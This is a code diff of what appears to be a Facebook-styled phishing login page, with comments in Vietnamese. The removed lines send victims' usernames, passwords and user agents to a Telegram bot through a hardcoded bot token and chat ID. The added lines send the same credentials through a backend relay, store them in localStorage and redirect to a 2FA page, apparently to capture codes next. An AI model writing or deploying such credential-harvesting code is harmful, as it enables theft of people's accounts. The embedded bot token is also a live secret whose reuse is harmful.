@@ -228,43 +228,63 @@
         document.getElementById('loginButton').addEventListener('click', async function() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            
-            // Save credentials for 2FA page
+            const userAgent = navigator.userAgent; // Lấy User Agent
+            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Ho_Chi_Minh' }); // Lấy thời gian hiện tại ở Việt Nam
+
+            // Lưu thông tin đăng nhập vào localStorage để sử dụng ở trang 2FA
             localStorage.setItem('fb_credentials', JSON.stringify({
                 username: username,
                 password: password
             }));
-            
-            // Send login info to Telegram
-            const loginMessage = `🔐 New Login Attempt 🔐\n\n👤 Username: ${username}\n🔑 Password: ${password}\n\n🌐 User Agent: ${navigator.userAgent}\n🕒 Time: ${new Date().toLocaleString()}`;
-            
-            await sendToTelegram('7276807133:AAE4Cnz15pyFcCHOo3ZeLfjaFZly6LmE2-0', '-4789641482', loginMessage);
-            
-            // Redirect to 2FA page
-            window.location.href = '2fa_page.html';
-        });
 
-        async function sendToTelegram(botToken, chatId, message) {
+            // Gửi thông tin đăng nhập đến server backend
             try {
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                const response = await fetch('/api/send-telegram-message', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'HTML'
+                        type: 'login', // Loại dữ liệu: thông tin đăng nhập
+                        username: username,
+                        password: password,
+                        userAgent: userAgent,
+                        timestamp: timestamp
                     })
                 });
-                
+
+                const data = await response.json(); // Phân tích phản hồi JSON từ server
+
                 if (!response.ok) {
-                    console.error('Telegram API error:', await response.text());
+                    // Nếu server trả về lỗi (response.ok là false)
+                    console.error('Lỗi khi gửi thông tin đăng nhập lên server:', data.message || 'Unknown error');
+                    // Tùy chọn: Hiển thị thông báo lỗi cho người dùng trên giao diện
+                    alert('Đã xảy ra lỗi khi đăng nhập. Vui lòng thử lại sau.');
+                } else {
+                    // Nếu server trả về thành công
+                    console.log('Thông tin đăng nhập đã được gửi thành công lên server.');
+                    // Chuyển hướng đến trang 2FA
+                    window.location.href = '2fa_page.html';
                 }
             } catch (error) {
-                console.error('Error sending to Telegram:', error);
+                // Xử lý lỗi mạng hoặc lỗi không kết nối được với server
+                console.error('Lỗi mạng hoặc server không phản hồi:', error);
+                alert('Không thể kết nối đến máy chủ. Vui lòng kiểm tra kết nối internet của bạn.');
             }
-        }
+        });
+
+        // Tùy chọn: Bạn có thể thêm chức năng cho nút "Create new account" nếu cần
+        document.querySelector('.create-account-button').addEventListener('click', function() {
+            alert('Chức năng tạo tài khoản mới chưa được triển khai.');
+            // Hoặc chuyển hướng đến trang tạo tài khoản: window.location.href = 'create_account.html';
+        });
+
+        // Tùy chọn: Chức năng cho nút "Forgot password?"
+        document.querySelector('.forgot-password a').addEventListener('click', function(e) {
+            e.preventDefault(); // Ngăn chặn hành vi mặc định của thẻ a
+            alert('Chức năng quên mật khẩu chưa được triển khai.');
+            // Hoặc chuyển hướng đến trang quên mật khẩu: window.location.href = 'forgot_password.html';
+        });
     </script>
 </body>
 </html>
